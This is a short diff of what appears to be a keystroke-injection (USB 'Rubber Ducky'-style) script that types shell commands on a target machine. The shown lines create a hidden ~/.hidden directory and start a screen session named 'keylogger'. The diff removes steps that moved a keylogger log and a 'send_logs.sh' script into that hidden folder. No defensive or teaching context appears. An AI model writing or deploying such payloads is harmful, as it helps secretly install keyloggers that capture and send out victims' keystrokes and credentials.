@@ -11,12 +11,6 @@ DELAY 1000
 STRING "mkdir ~/.hidden"
 DELAY 500
 ENTER
-STRING "mv ~/Desktop/keylogger.txt ~/.hidden/keylogger.txt"
-DELAY 500
-ENTER
-STRING "mv ~/Desktop/send_logs.sh ~/.hidden/send_logs.sh"
-DELAY 500
-ENTER
 STRING "screen -S keylogger"
 DELAY 500
 ENTER
